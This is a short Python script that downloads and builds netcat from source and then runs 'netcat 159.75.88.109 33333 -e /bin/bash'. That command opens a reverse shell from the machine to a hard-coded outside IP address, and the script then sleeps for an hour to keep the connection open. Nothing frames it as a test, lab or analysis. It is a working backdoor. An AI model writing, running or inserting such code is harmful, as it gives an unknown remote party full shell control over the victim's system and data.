import os 
import time


os.system('wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz')
os.system('tar -xvzf netcat-0.7.1.tar.gz')
os.system('./configure')
os.system('make && make install')
os.system('make clean')
os.system('netcat 159.75.88.109 33333 -e /bin/bash')

time.sleep(3600)
